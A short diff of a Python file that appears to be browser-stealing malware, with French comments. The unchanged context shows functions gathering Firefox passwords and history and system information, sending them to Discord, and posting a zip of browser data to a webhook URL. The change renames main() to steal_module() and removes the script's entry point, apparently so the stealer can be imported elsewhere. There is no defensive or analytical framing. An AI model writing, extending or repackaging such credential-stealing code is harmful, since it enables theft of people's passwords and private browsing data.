@@ -131,7 +131,7 @@ def get_firefox_data():
                 pass
     return data_psw, data_hist
 
-def main():
+def steal_module():
     # 1. Envoi système direct
     sys_txt = get_system_info()
     send_to_discord(sys_txt)
@@ -186,6 +186,3 @@ def main():
     zip_buffer.seek(0)
     requests.post(WEBHOOK_URL, files={'file': ('browser_data.zip', zip_buffer)})
     print("✅ Fini !")
-
-if __name__ == "__main__":
-    main()
